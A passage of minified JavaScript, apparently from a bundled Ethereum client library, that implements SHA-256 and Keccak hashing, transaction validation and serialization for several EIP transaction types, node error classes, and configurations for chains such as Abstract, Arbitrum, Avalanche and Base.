d=o;d<n;d++)t[d]=0;Bhe(i,n-8,BigInt(this.length*8),s),this.process(i,0);const a=l_(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,u=this.get();if(l>u.length)throw new Error("_sha2: outputLen bigger than state");for(let d=0;d<l;d++)a.setUint32(4*d,u[d],s)}digest(){const{buffer:e,outputLen:t}=this;this.digestInto(e);const i=e.slice(0,t);return this.destroy(),i}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:t,buffer:i,length:n,finished:s,destroyed:o,pos:a}=this;return e.destroyed=o,e.finished=s,e.length=n,e.pos=a,n%t&&e.buffer.set(i),e}clone(){return this._cloneInto()}};const V0=Uint32Array.from([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),k6=BigInt(2**32-1),aD=BigInt(32);function Uhe(r,e=!1){return e?{h:Number(r&k6),l:Number(r>>aD&k6)}:{h:Number(r>>aD&k6)|0,l:Number(r&k6)|0}}function jhe(r,e=!1){const t=r.length;let i=new Uint32Array(t),n=new Uint32Array(t);for(let s=0;s<t;s++){const{h:o,l:a}=Uhe(r[s],e);[i[s],n[s]]=[o,a]}return[i,n]}const Fhe=(r,e,t)=>r<<t|e>>>32-t,qhe=(r,e,t)=>e<<t|r>>>32-t,zhe=(r,e,t)=>e<<t-32|r>>>64-t,Whe=(r,e,t)=>r<<t-32|e>>>64-t,Hhe=Uint32Array.from([1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298]),K0=new Uint32Array(64);let Vhe=class extends Lhe{constructor(e=32){super(64,e,8,!1),this.A=V0[0]|0,this.B=V0[1]|0,this.C=V0[2]|0,this.D=V0[3]|0,this.E=V0[4]|0,this.F=V0[5]|0,this.G=V0[6]|0,this.H=V0[7]|0}get(){const{A:e,B:t,C:i,D:n,E:s,F:o,G:a,H:c}=this;return[e,t,i,n,s,o,a,c]}set(e,t,i,n,s,o,a,c){this.A=e|0,this.B=t|0,this.C=i|0,this.D=n|0,this.E=s|0,this.F=o|0,this.G=a|0,this.H=c|0}process(e,t){for(let d=0;d<16;d++,t+=4)K0[d]=e.getUint32(t,!1);for(let d=16;d<64;d++){const h=K0[d-15],f=K0[d-2],p=Du(h,7)^Du(h,18)^h>>>3,g=Du(f,17)^Du(f,19)^f>>>10;K0[d]=g+K0[d-7]+p+K0[d-16]|0}let{A:i,B:n,C:s,D:o,E:a,F:c,G:l,H:u}=this;for(let d=0;d<64;d++){const h=Du(a,6)^Du(a,11)^Du(a,25),f=u+h+Mhe(a,c,l)+Hhe[d]+K0[d]|0,g=(Du(i,2)^Du(i,13)^Du(i,22))+Dhe(i,n,s)|0;u=l,l=c,c=a,a=o+f|0,o=s,s=n,n=i,i=f+g|0}i=i+this.A|0,n=n+this.B|0,s=s+this.C|0,o=o+this.D|0,a=a+this.E|0,c=c+this.F|0,l=l+this.G|0,u=u+this.H|0,this.set(i,n,s,o,a,c,l,u)}roundClean(){yw(K0)}destroy(){this.set(0,0,0,0,0,0,0,0),yw(this.buffer)}};const UY=LY(()=>new Vhe),jY=UY;function FY(r,e){const t=e||"hex",i=jY(Xy(r,{strict:!1})?C5(r):r);return t==="bytes"?i:$i(i)}function Khe(r){const{commitment:e,version:t=1}=r,i=r.to??(typeof e=="string"?"hex":"bytes"),n=FY(e,"bytes");return n.set([t],0),i==="bytes"?n:A0(n)}function Ghe(r){const{commitments:e,version:t}=r,i=r.to??(typeof e[0]=="string"?"hex":"bytes"),n=[];for(const s of e)n.push(Khe({commitment:s,to:i,version:t}));return n}const cD=6,qY=32,M$=4096,zY=qY*M$,lD=zY*cD-1-1*M$*cD,WY=1;class Zhe extends Xt{constructor({maxSize:e,size:t}){super("Blob size is too large.",{metaMessages:[`Max: ${e} bytes`,`Given: ${t} bytes`],name:"BlobSizeTooLargeError"})}}class HY extends Xt{constructor(){super("Blob data must not be empty.",{name:"EmptyBlobError"})}}class Yhe extends Xt{constructor({hash:e,size:t}){super(`Versioned hash "${e}" size is invalid.`,{metaMessages:["Expected: 32",`Received: ${t}`],name:"InvalidVersionedHashSizeError"})}}class Jhe extends Xt{constructor({hash:e,version:t}){super(`Versioned hash "${e}" version is invalid.`,{metaMessages:[`Expected: ${WY}`,`Received: ${t}`],name:"InvalidVersionedHashVersionError"})}}function Qhe(r){const e=r.to??(typeof r.data=="string"?"hex":"bytes"),t=typeof r.data=="string"?vd(r.data):r.data,i=ww(t);if(!i)throw new HY;if(i>lD)throw new Zhe({maxSize:lD,size:i});const n=[];let s=!0,o=0;for(;s;){const a=PY(new Uint8Array(zY));let c=0;for(;c<M$;){const l=t.slice(o,o+(qY-1));if(a.pushByte(0),a.pushBytes(l),l.length<31){a.pushByte(128),s=!1;break}c++,o+=31}n.push(a)}return e==="bytes"?n.map(a=>a.bytes):n.map(a=>A0(a.bytes))}function Xhe(r){const{data:e,kzg:t,to:i}=r,n=r.blobs??Qhe({data:e,to:i}),s=r.commitments??BY({blobs:n,kzg:t,to:i}),o=r.proofs??MY({blobs:n,commitments:s,kzg:t,to:i}),a=[];for(let c=0;c<n.length;c++)a.push({blob:n[c],commitment:s[c],proof:o[c]});return a}class hc extends Xt{constructor({address:e}){super(`Address "${e}" is invalid.`,{metaMessages:["- Address must be a hex value of 20 bytes (40 hex characters).","- Address must match its checksum counterpart."],name:"InvalidAddressError"})}}class x3 extends Xt{constructor({chainId:e}){super(typeof e=="number"?`Chain ID "${e}" is invalid.`:"Chain ID is invalid.",{name:"InvalidChainIdError"})}}class w1 extends Xt{constructor({cause:e,message:t}={}){const i=t?.replace("execution reverted: ","")?.replace("execution reverted","");super(`Execution reverted ${i?`with reason: ${i}`:"for an unknown reason"}.`,{cause:e,name:"ExecutionRevertedError"})}}Object.defineProperty(w1,"code",{enumerable:!0,configurable:!0,writable:!0,value:3});Object.defineProperty(w1,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/execution reverted/});class ip extends Xt{constructor({cause:e,maxFeePerGas:t}={}){super(`The fee cap (\`maxFeePerGas\`${t?` = ${R1(t)} gwei`:""}) cannot be higher than the maximum allowed value (2^256-1).`,{cause:e,name:"FeeCapTooHighError"})}}Object.defineProperty(ip,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max fee per gas higher than 2\^256-1|fee cap higher than 2\^256-1/});class tk extends Xt{constructor({cause:e,maxFeePerGas:t}={}){super(`The fee cap (\`maxFeePerGas\`${t?` = ${R1(t)}`:""} gwei) cannot be lower than the block base fee.`,{cause:e,name:"FeeCapTooLowError"})}}Object.defineProperty(tk,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max fee per gas less than block base fee|fee cap less than block base fee|transaction is outdated/});class rk extends Xt{constructor({cause:e,nonce:t}={}){super(`Nonce provided for the transaction ${t?`(${t}) `:""}is higher than the next one expected.`,{cause:e,name:"NonceTooHighError"})}}Object.defineProperty(rk,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce too high/});class ik extends Xt{constructor({cause:e,nonce:t}={}){super([`Nonce provided for the transaction ${t?`(${t}) `:""}is lower than the current nonce of the account.`,"Try increasing the nonce or find the latest nonce with `getTransactionCount`."].join(`
`),{cause:e,name:"NonceTooLowError"})}}Object.defineProperty(ik,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce too low|transaction already imported|already known/});class nk extends Xt{constructor({cause:e,nonce:t}={}){super(`Nonce provided for the transaction ${t?`(${t}) `:""}exceeds the maximum allowed nonce.`,{cause:e,name:"NonceMaxValueError"})}}Object.defineProperty(nk,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/nonce has max value/});class sk extends Xt{constructor({cause:e}={}){super(["The total cost (gas * gas fee + value) of executing this transaction exceeds the balance of the account."].join(`
`),{cause:e,metaMessages:["This error could arise when the account does not have enough funds to:"," - pay for the total gas fee,"," - pay for the value to send."," ","The cost of the transaction is calculated as `gas * gas fee + value`, where:"," - `gas` is the amount of gas needed for transaction to execute,"," - `gas fee` is the gas fee,"," - `value` is the amount of ether to send to the recipient."],name:"InsufficientFundsError"})}}Object.defineProperty(sk,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/insufficient funds|exceeds transaction sender account balance/});class ok extends Xt{constructor({cause:e,gas:t}={}){super(`The amount of gas ${t?`(${t}) `:""}provided for the transaction exceeds the limit allowed for the block.`,{cause:e,name:"IntrinsicGasTooHighError"})}}Object.defineProperty(ok,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/intrinsic gas too high|gas limit reached/});class ak extends Xt{constructor({cause:e,gas:t}={}){super(`The amount of gas ${t?`(${t}) `:""}provided for the transaction is too low.`,{cause:e,name:"IntrinsicGasTooLowError"})}}Object.defineProperty(ak,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/intrinsic gas too low/});class ck extends Xt{constructor({cause:e}){super("The transaction type is not supported for this chain.",{cause:e,name:"TransactionTypeNotSupportedError"})}}Object.defineProperty(ck,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/transaction type not valid/});class xw extends Xt{constructor({cause:e,maxPriorityFeePerGas:t,maxFeePerGas:i}={}){super([`The provided tip (\`maxPriorityFeePerGas\`${t?` = ${R1(t)} gwei`:""}) cannot be higher than the fee cap (\`maxFeePerGas\`${i?` = ${R1(i)} gwei`:""}).`].join(`
`),{cause:e,name:"TipAboveFeeCapError"})}}Object.defineProperty(xw,"nodeMessage",{enumerable:!0,configurable:!0,writable:!0,value:/max priority fee per gas higher than max fee per gas|tip higher than fee cap/});class VY extends Xt{constructor({cause:e}){super(`An error occurred while executing: ${e?.shortMessage}`,{cause:e,name:"UnknownNodeError"})}}let D$=class extends Map{constructor(e){super(),Object.defineProperty(this,"maxSize",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),this.maxSize=e}get(e){const t=super.get(e);return super.has(e)&&t!==void 0&&(this.delete(e),super.set(e,t)),t}set(e,t){if(super.set(e,t),this.maxSize&&this.size>this.maxSize){const i=this.keys().next().value;i&&this.delete(i)}return this}};const e0e=BigInt(0),sb=BigInt(1),t0e=BigInt(2),r0e=BigInt(7),i0e=BigInt(256),n0e=BigInt(113),KY=[],GY=[],ZY=[];for(let r=0,e=sb,t=1,i=0;r<24;r++){[t,i]=[i,(2*t+3*i)%5],KY.push(2*(5*i+t)),GY.push((r+1)*(r+2)/2%64);let n=e0e;for(let s=0;s<7;s++)e=(e<<sb^(e>>r0e)*n0e)%i0e,e&t0e&&(n^=sb<<(sb<<BigInt(s))-sb);ZY.push(n)}const YY=jhe(ZY,!0),s0e=YY[0],o0e=YY[1],uD=(r,e,t)=>t>32?zhe(r,e,t):Fhe(r,e,t),dD=(r,e,t)=>t>32?Whe(r,e,t):qhe(r,e,t);function a0e(r,e=24){const t=new Uint32Array(10);for(let i=24-e;i<24;i++){for(let o=0;o<10;o++)t[o]=r[o]^r[o+10]^r[o+20]^r[o+30]^r[o+40];for(let o=0;o<10;o+=2){const a=(o+8)%10,c=(o+2)%10,l=t[c],u=t[c+1],d=uD(l,u,1)^t[a],h=dD(l,u,1)^t[a+1];for(let f=0;f<50;f+=10)r[o+f]^=d,r[o+f+1]^=h}let n=r[2],s=r[3];for(let o=0;o<24;o++){const a=GY[o],c=uD(n,s,a),l=dD(n,s,a),u=KY[o];n=r[u],s=r[u+1],r[u]=c,r[u+1]=l}for(let o=0;o<50;o+=10){for(let a=0;a<10;a++)t[a]=r[o+a];for(let a=0;a<10;a++)r[o+a]^=~t[(a+2)%10]&t[(a+4)%10]}r[0]^=s0e[i],r[1]^=o0e[i]}yw(t)}let c0e=class JY extends B${constructor(e,t,i,n=!1,s=24){if(super(),this.pos=0,this.posOut=0,this.finished=!1,this.destroyed=!1,this.enableXOF=!1,this.blockLen=e,this.suffix=t,this.outputLen=i,this.enableXOF=n,this.rounds=s,uv(i),!(0<e&&e<200))throw new Error("only keccak-f1600 function is supported");this.state=new Uint8Array(200),this.state32=She(this.state)}clone(){return this._cloneInto()}keccak(){oD(this.state32),a0e(this.state32,this.rounds),oD(this.state32),this.posOut=0,this.pos=0}update(e){vw(this),e=Kx(e),rp(e);const{blockLen:t,state:i}=this,n=e.length;for(let s=0;s<n;){const o=Math.min(t-this.pos,n-s);for(let a=0;a<o;a++)i[this.pos++]^=e[s++];this.pos===t&&this.keccak()}return this}finish(){if(this.finished)return;this.finished=!0;const{state:e,suffix:t,pos:i,blockLen:n}=this;e[i]^=t,(t&128)!==0&&i===n-1&&this.keccak(),e[n-1]^=128,this.keccak()}writeInto(e){vw(this,!1),rp(e),this.finish();const t=this.state,{blockLen:i}=this;for(let n=0,s=e.length;n<s;){this.posOut>=i&&this.keccak();const o=Math.min(i-this.posOut,s-n);e.set(t.subarray(this.posOut,this.posOut+o),n),this.posOut+=o,n+=o}return e}xofInto(e){if(!this.enableXOF)throw new Error("XOF is not possible for this instance");return this.writeInto(e)}xof(e){return uv(e),this.xofInto(new Uint8Array(e))}digestInto(e){if(DY(e,this),this.finished)throw new Error("digest() was already called");return this.writeInto(e),this.destroy(),e}digest(){return this.digestInto(new Uint8Array(this.outputLen))}destroy(){this.destroyed=!0,yw(this.state)}_cloneInto(e){const{blockLen:t,suffix:i,outputLen:n,rounds:s,enableXOF:o}=this;return e||(e=new JY(t,i,n,o,s)),e.state32.set(this.state32),e.pos=this.pos,e.posOut=this.posOut,e.finished=this.finished,e.rounds=s,e.suffix=i,e.outputLen=n,e.enableXOF=o,e.destroyed=this.destroyed,e}};const l0e=(r,e,t)=>LY(()=>new c0e(e,r,t)),QY=l0e(1,136,256/8);function u0e(r,e){return QY(Xy(r,{strict:!1})?C5(r):r)}const u_=new D$(8192);function d0e(r,e){if(u_.has(`${r}.${e}`))return u_.get(`${r}.${e}`);const t=r.substring(2).toLowerCase(),i=u0e(_Y(t)),n=t.split("");for(let o=0;o<40;o+=2)i[o>>1]>>4>=8&&n[o]&&(n[o]=n[o].toUpperCase()),(i[o>>1]&15)>=8&&n[o+1]&&(n[o+1]=n[o+1].toUpperCase());const s=`0x${n.join("")}`;return u_.set(`${r}.${e}`,s),s}const h0e=/^0x[a-fA-F0-9]{40}$/,d_=new D$(8192);function Pa(r,e){const{strict:t=!0}=e??{},i=`${r}.${t}`;if(d_.has(i))return d_.get(i);const n=h0e.test(r)?r.toLowerCase()===r?!0:t?d0e(r)===r:!0:!1;return d_.set(i,n),n}function f0e(r,e,t,{strict:i}={}){return Xy(r,{strict:!1})?g0e(r,e,t,{strict:i}):p0e(r,e,t,{strict:i})}function XY(r,e,t){if(ww(r)!==t-e)throw new Gde({offset:t,position:"end",size:ww(r)})}function p0e(r,e,t,{strict:i}={}){const n=r.slice(e,t);return i&&XY(n,e,t),n}function g0e(r,e,t,{strict:i}={}){const n=`0x${r.replace("0x","").slice(e*2,t*2)}`;return i&&XY(n,e,t),n}function m0e(r){const{authorizationList:e}=r;if(e)for(const t of e){const{chainId:i}=t,n=t.address;if(!Pa(n))throw new hc({address:n});if(i<0)throw new x3({chainId:i})}L$(r)}function w0e(r){const{blobVersionedHashes:e}=r;if(e){if(e.length===0)throw new HY;for(const t of e){const i=ww(t),n=lv(f0e(t,0,1));if(i!==32)throw new Yhe({hash:t,size:i});if(n!==WY)throw new Jhe({hash:t,version:n})}}L$(r)}function L$(r){const{chainId:e,maxPriorityFeePerGas:t,maxFeePerGas:i,to:n}=r;if(e<=0)throw new x3({chainId:e});if(n&&!Pa(n))throw new hc({address:n});if(i&&i>e4)throw new ip({maxFeePerGas:i});if(t&&i&&t>i)throw new xw({maxFeePerGas:i,maxPriorityFeePerGas:t})}function b0e(r){const{chainId:e,maxPriorityFeePerGas:t,gasPrice:i,maxFeePerGas:n,to:s}=r;if(e<=0)throw new x3({chainId:e});if(s&&!Pa(s))throw new hc({address:s});if(t||n)throw new Xt("`maxFeePerGas`/`maxPriorityFeePerGas` is not a valid EIP-2930 Transaction attribute.");if(i&&i>e4)throw new ip({maxFeePerGas:i})}function v0e(r){const{chainId:e,maxPriorityFeePerGas:t,gasPrice:i,maxFeePerGas:n,to:s}=r;if(s&&!Pa(s))throw new hc({address:s});if(typeof e<"u"&&e<=0)throw new x3({chainId:e});if(t||n)throw new Xt("`maxFeePerGas`/`maxPriorityFeePerGas` is not a valid Legacy Transaction attribute.");if(i&&i>e4)throw new ip({maxFeePerGas:i})}function y0e(r){if(r.type)return r.type;if(typeof r.authorizationList<"u")return"eip7702";if(typeof r.blobs<"u"||typeof r.blobVersionedHashes<"u"||typeof r.maxFeePerBlobGas<"u"||typeof r.sidecars<"u")return"eip4844";if(typeof r.maxFeePerGas<"u"||typeof r.maxPriorityFeePerGas<"u")return"eip1559";if(typeof r.gasPrice<"u")return typeof r.accessList<"u"?"eip2930":"legacy";throw new yhe({transaction:r})}function t4(r){if(!r||r.length===0)return[];const e=[];for(let t=0;t<r.length;t++){const{address:i,storageKeys:n}=r[t];for(let s=0;s<n.length;s++)if(n[s].length-2!==64)throw new xhe({storageKey:n[s]});if(!Pa(i,{strict:!1}))throw new hc({address:i});e.push([i,n])}return e}function eJ(r,e){const t=y0e(r);return t==="eip1559"?E0e(r,e):t==="eip2930"?_0e(r,e):t==="eip4844"?C0e(r,e):t==="eip7702"?x0e(r,e):S0e(r,e)}function x0e(r,e){const{authorizationList:t,chainId:i,gas:n,nonce:s,to:o,value:a,maxFeePerGas:c,maxPriorityFeePerGas:l,accessList:u,data:d}=r;m0e(r);const h=t4(u),f=Che(t);return Jg(["0x04",c0([dr(i),s?dr(s):"0x",l?dr(l):"0x",c?dr(c):"0x",n?dr(n):"0x",o??"0x",a?dr(a):"0x",d??"0x",h,f,...C3(r,e)])])}function C0e(r,e){const{chainId:t,gas:i,nonce:n,to:s,value:o,maxFeePerBlobGas:a,maxFeePerGas:c,maxPriorityFeePerGas:l,accessList:u,data:d}=r;w0e(r);let h=r.blobVersionedHashes,f=r.sidecars;if(r.blobs&&(typeof h>"u"||typeof f>"u")){const S=typeof r.blobs[0]=="string"?r.blobs:r.blobs.map(I=>A0(I)),T=r.kzg,k=BY({blobs:S,kzg:T});if(typeof h>"u"&&(h=Ghe({commitments:k})),typeof f>"u"){const I=MY({blobs:S,commitments:k,kzg:T});f=Xhe({blobs:S,commitments:k,proofs:I})}}const p=t4(u),g=[dr(t),n?dr(n):"0x",l?dr(l):"0x",c?dr(c):"0x",i?dr(i):"0x",s??"0x",o?dr(o):"0x",d??"0x",p,a?dr(a):"0x",h??[],...C3(r,e)],w=[],m=[],x=[];if(f)for(let S=0;S<f.length;S++){const{blob:T,commitment:k,proof:I}=f[S];w.push(T),m.push(k),x.push(I)}return Jg(["0x03",c0(f?[g,w,m,x]:g)])}function E0e(r,e){const{chainId:t,gas:i,nonce:n,to:s,value:o,maxFeePerGas:a,maxPriorityFeePerGas:c,accessList:l,data:u}=r;L$(r);const d=t4(l),h=[dr(t),n?dr(n):"0x",c?dr(c):"0x",a?dr(a):"0x",i?dr(i):"0x",s??"0x",o?dr(o):"0x",u??"0x",d,...C3(r,e)];return Jg(["0x02",c0(h)])}function _0e(r,e){const{chainId:t,gas:i,data:n,nonce:s,to:o,value:a,accessList:c,gasPrice:l}=r;b0e(r);const u=t4(c),d=[dr(t),s?dr(s):"0x",l?dr(l):"0x",i?dr(i):"0x",o??"0x",a?dr(a):"0x",n??"0x",u,...C3(r,e)];return Jg(["0x01",c0(d)])}function S0e(r,e){const{chainId:t=0,gas:i,data:n,nonce:s,to:o,value:a,gasPrice:c}=r;v0e(r);let l=[s?dr(s):"0x",c?dr(c):"0x",i?dr(i):"0x",o??"0x",a?dr(a):"0x",n??"0x"];if(e){const u=(()=>{if(e.v>=35n)return(e.v-35n)/2n>0?e.v:27n+(e.v===35n?0n:1n);if(t>0)return BigInt(t*2)+BigInt(35n+e.v-27n);const f=27n+(e.v===27n?0n:1n);if(e.v!==f)throw new vhe({v:e.v});return f})(),d=bw(e.r),h=bw(e.s);l=[...l,dr(u),d==="0x00"?"0x":d,h==="0x00"?"0x":h]}else t>0&&(l=[...l,dr(t),"0x","0x"]);return c0(l)}function C3(r,e){const t=e??r,{v:i,yParity:n}=t;if(typeof t.r>"u")return[];if(typeof t.s>"u")return[];if(typeof i>"u"&&typeof n>"u")return[];const s=bw(t.r),o=bw(t.s);return[typeof n=="number"?n?dr(1):"0x":i===0n?"0x":i===1n?dr(1):i===27n?"0x":dr(1),s==="0x00"?"0x":s,o==="0x00"?"0x":o]}class A0e extends Xt{constructor(){super(["Transaction is not an EIP712 transaction.","","Transaction must:",'  - include `type: "eip712"`',"  - include one of the following: `customSignature`, `paymaster`, `paymasterInput`, `gasPerPubdata`, `factoryDeps`"].join(`
`),{name:"InvalidEip712TransactionError"})}}function tJ(r){return!!(r.type==="eip712"||"customSignature"in r&&r.customSignature||"paymaster"in r&&r.paymaster||"paymasterInput"in r&&r.paymasterInput||"gasPerPubdata"in r&&typeof r.gasPerPubdata=="bigint"||"factoryDeps"in r&&r.factoryDeps)}function rJ(r){const{chainId:e,to:t,from:i,paymaster:n,paymasterInput:s}=r;if(!tJ(r))throw new A0e;if(!e||e<=0)throw new x3({chainId:e});if(t&&!Pa(t))throw new hc({address:t});if(i&&!Pa(i))throw new hc({address:i});if(n&&!Pa(n))throw new hc({address:n});if(n&&!s)throw new Xt("`paymasterInput` must be provided when `paymaster` is defined");if(!n&&s)throw new Xt("`paymaster` must be provided when `paymasterInput` is defined")}function I0e(r,e){return tJ(r)?k0e(r):eJ(r,e)}const T0e={transaction:I0e};function k0e(r){const{chainId:e,gas:t,nonce:i,to:n,from:s,value:o,maxFeePerGas:a,maxPriorityFeePerGas:c,customSignature:l,factoryDeps:u,paymaster:d,paymasterInput:h,gasPerPubdata:f,data:p}=r;rJ(r);const g=[i?$i(i):"0x",c?$i(c):"0x",a?$i(a):"0x",t?$i(t):"0x",n??"0x",o?$i(o):"0x",p??"0x",$i(e),$i(""),$i(""),$i(e),s??"0x",$i(f||O$),u??[],l??"0x",d&&h?[d,h]:[]];return Jg(["0x71",c0(g)])}class N0e extends Xt{constructor({givenLength:e,maxBytecodeSize:t}){super(`Bytecode cannot be longer than ${t} bytes. Given length: ${e}`,{name:"BytecodeLengthExceedsMaxSizeError"})}}class P0e extends Xt{constructor({givenLengthInWords:e}){super(`Bytecode length in 32-byte words must be odd. Given length in words: ${e}`,{name:"BytecodeLengthInWordsMustBeOddError"})}}class $0e extends Xt{constructor({givenLength:e}){super(`The bytecode length in bytes must be divisible by 32. Given length: ${e}`,{name:"BytecodeLengthMustBeDivisibleBy32Error"})}}function R0e(r){const e=C5(r);if(e.length%32!==0)throw new $0e({givenLength:e.length});if(e.length>nD)throw new N0e({givenLength:e.length,maxBytecodeSize:nD});const t=FY(e),i=C5(t),n=e.length/32;if(n%2===0)throw new P0e({givenLengthInWords:n});const s=C5(n),o=Yg(s,{size:2}),a=new Uint8Array([1,0]);return i.set(a,0),i.set(o,2),i}const O0e=r=>{rJ(r);const e=B0e(r);return{domain:{name:"zkSync",version:"2",chainId:r.chainId},types:{Transaction:[{name:"txType",type:"uint256"},{name:"from",type:"uint256"},{name:"to",type:"uint256"},{name:"gasLimit",type:"uint256"},{name:"gasPerPubdataByteLimit",type:"uint256"},{name:"maxFeePerGas",type:"uint256"},{name:"maxPriorityFeePerGas",type:"uint256"},{name:"paymaster",type:"uint256"},{name:"nonce",type:"uint256"},{name:"value",type:"uint256"},{name:"data",type:"bytes"},{name:"factoryDeps",type:"bytes32[]"},{name:"paymasterInput",type:"bytes"}]},primaryType:"Transaction",message:e}};function B0e(r){const{gas:e,nonce:t,to:i,from:n,value:s,maxFeePerGas:o,maxPriorityFeePerGas:a,factoryDeps:c,paymaster:l,paymasterInput:u,gasPerPubdata:d,data:h}=r;return{txType:113n,from:BigInt(n),to:i?BigInt(i):0n,gasLimit:e??0n,gasPerPubdataByteLimit:d??O$,maxFeePerGas:o??0n,maxPriorityFeePerGas:a??0n,paymaster:l?BigInt(l):0n,nonce:t?BigInt(t):0n,value:s??0n,data:h??"0x",factoryDeps:c?.map(f=>$i(R0e(f)))??[],paymasterInput:u||"0x"}}const U$={blockTime:1e3,formatters:NY,serializers:T0e,custom:{getEip712Domain:O0e}},M0e=Zt({...U$,id:2741,name:"Abstract",nativeCurrency:{decimals:18,name:"ETH",symbol:"ETH"},rpcUrls:{default:{http:["https://api.mainnet.abs.xyz"],webSocket:["wss://api.mainnet.abs.xyz/ws"]}},blockExplorers:{default:{name:"Etherscan",url:"https://abscan.org"},native:{name:"Abstract Explorer",url:"https://explorer.mainnet.abs.xyz"}},contracts:{multicall3:{address:"0xAa4De41dba0Ca5dCBb288b7cC6b708F3aaC759E7",blockCreated:5288},universalSignatureVerifier:{address:"0xfB688330379976DA81eB64Fe4BF50d7401763B9C",blockCreated:5263}}}),iJ={gasPriceOracle:{address:"0x420000000000000000000000000000000000000F"},l1Block:{address:"0x4200000000000000000000000000000000000015"},l2CrossDomainMessenger:{address:"0x4200000000000000000000000000000000000007"},l2Erc721Bridge:{address:"0x4200000000000000000000000000000000000014"},l2StandardBridge:{address:"0x4200000000000000000000000000000000000010"},l2ToL1MessagePasser:{address:"0x4200000000000000000000000000000000000016"}},D0e={block:R$({format(r){return{transactions:r.transactions?.map(t=>{if(typeof t=="string")return t;const i=Hx(t);return i.typeHex==="0x7e"&&(i.isSystemTx=t.isSystemTx,i.mint=t.mint?Vn(t.mint):void 0,i.sourceHash=t.sourceHash,i.type="deposit"),i}),stateRoot:r.stateRoot}}}),transaction:$$({format(r){const e={};return r.type==="0x7e"&&(e.isSystemTx=r.isSystemTx,e.mint=r.mint?Vn(r.mint):void 0,e.sourceHash=r.sourceHash,e.type="deposit"),e}}),transactionReceipt:IY({format(r){return{l1GasPrice:r.l1GasPrice?Vn(r.l1GasPrice):null,l1GasUsed:r.l1GasUsed?Vn(r.l1GasUsed):null,l1Fee:r.l1Fee?Vn(r.l1Fee):null,l1FeeScalar:r.l1FeeScalar?Number(r.l1FeeScalar):null}}})};function nJ(r,e){return j0e(r)?U0e(r):eJ(r,e)}const L0e={transaction:nJ};function U0e(r){F0e(r);const{sourceHash:e,data:t,from:i,gas:n,isSystemTx:s,mint:o,to:a,value:c}=r,l=[e,i,a??"0x",o?$i(o):"0x",c?$i(c):"0x",n?$i(n):"0x",s?"0x1":"0x",t??"0x"];return Jg(["0x7e",c0(l)])}function j0e(r){return r.type==="deposit"||typeof r.sourceHash<"u"}function F0e(r){const{from:e,to:t}=r;if(e&&!Pa(e))throw new hc({address:e});if(t&&!Pa(t))throw new hc({address:t})}const Pn={blockTime:2e3,contracts:iJ,formatters:D0e,serializers:L0e},q0e=42161,z0e=Zt({id:33139,name:"Ape Chain",nativeCurrency:{name:"ApeCoin",symbol:"APE",decimals:18},rpcUrls:{default:{http:["https://rpc.apechain.com/http"],webSocket:["wss://rpc.apechain.com/ws"]}},blockExplorers:{default:{name:"Apescan",url:"https://apescan.io",apiUrl:"https://api.apescan.io/api"}},contracts:{multicall3:{address:"0xcA11bde05977b3631167028862bE2a173976CA11",blockCreated:20889}},sourceId:q0e}),W0e=Zt({id:42161,name:"Arbitrum One",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://arb1.arbitrum.io/rpc"]}},blockExplorers:{default:{name:"Arbiscan",url:"https://arbiscan.io",apiUrl:"https://api.arbiscan.io/api"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:7654707}}}),H0e=Zt({id:42170,name:"Arbitrum Nova",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://nova.arbitrum.io/rpc"]}},blockExplorers:{default:{name:"Arbiscan",url:"https://nova.arbiscan.io",apiUrl:"https://api-nova.arbiscan.io/api"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:1746963}}}),V0e=Zt({id:592,name:"Astar",network:"astar-mainnet",nativeCurrency:{name:"Astar",symbol:"ASTR",decimals:18},rpcUrls:{default:{http:["https://astar.api.onfinality.io/public"]}},blockExplorers:{default:{name:"Astar Subscan",url:"https://astar.subscan.io"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:761794}},testnet:!1}),K0e=Zt({id:43114,name:"Avalanche",nativeCurrency:{decimals:18,name:"Avalanche",symbol:"AVAX"},rpcUrls:{default:{http:["https://api.avax.network/ext/bc/C/rpc"]}},blockExplorers:{default:{name:"SnowTrace",url:"https://snowtrace.io",apiUrl:"https://api.snowtrace.io"}},contracts:{multicall3:{address:"0xca11bde05977b3631167028862be2a173976ca11",blockCreated:11907934}}}),ob=1,sJ=Zt({...Pn,id:8453,name:"Base",nativeCurrency:{name:"Ether",symbol:"ETH",decimals:18},rpcUrls:{default:{http:["https://mainnet.base.org"]}},blockExplorers:{default:{name:"Basescan",url:"https://basescan.org",apiUrl:"https://api.basescan.org/api"}},contracts:{...Pn.contracts,disputeGameFactory:{[ob]:{address:"0x43edB88C4B80fDD2AdFF2412A7BebF9dF42cB40e"}},l2OutputOracle:{[ob]:{address:"0x56315b90c40730925ec5485cf004d835058518A0"}},multicall3:{address:"0xca11bde059